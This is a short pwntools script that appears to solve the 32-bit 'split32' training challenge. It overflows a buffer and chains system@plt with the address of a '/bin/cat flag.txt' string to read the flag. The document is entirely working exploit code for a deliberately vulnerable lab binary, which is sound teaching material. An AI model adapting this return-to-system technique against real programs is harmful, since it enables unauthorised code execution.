from pwn import *

context.update(arch='i386', os='linux')

e = ELF('./split32')
system_addr = e.plt['system']
cmd_addr = next(e.search('/bin/cat flag.txt'))

p = process('./split32')
p.recvuntil('>')

payload = 'A'*44
payload += p32(system_addr)
payload += 'A'*4 # Garbage return address
payload += p32(cmd_addr)

p.sendline(payload)

p.interactive()